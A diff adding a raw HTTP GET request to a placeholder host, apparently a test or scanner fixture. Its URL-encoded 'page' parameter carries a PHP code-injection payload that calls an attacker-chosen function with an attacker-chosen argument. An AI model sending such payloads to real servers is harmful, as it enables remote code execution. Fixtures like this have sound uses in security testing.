@@ -1,0 +1,4 @@
+GET /a?page=%24_GET%5B%27func%27%5D%28%24_GET%5B%27arg%27%5D%29%3B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
